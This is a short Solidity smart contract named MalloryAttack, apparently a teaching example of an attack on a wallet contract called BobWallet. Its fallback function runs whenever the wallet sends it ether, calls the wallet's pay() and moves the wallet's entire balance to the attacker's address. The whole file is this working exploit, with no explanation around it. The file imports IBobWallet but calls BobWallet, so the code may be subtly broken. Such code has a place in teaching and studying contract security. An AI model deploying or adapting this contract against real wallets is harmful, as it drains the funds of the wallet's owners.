// SPDX-License-Identifier: MIT

pragma solidity 0.8.12;

import "./IBobWallet.sol";

contract MalloryAttack {
    address payable attacker;

    constructor() {
        attacker = payable(msg.sender);
    }

    function balanceOfAttacker() external view returns (uint256) {
        return address(this).balance;
    }

    function attack(address wallet) internal {
        BobWallet(wallet).pay(attacker, wallet.balance);

    }

    fallback() external payable {
        attack(msg.sender);
    }
}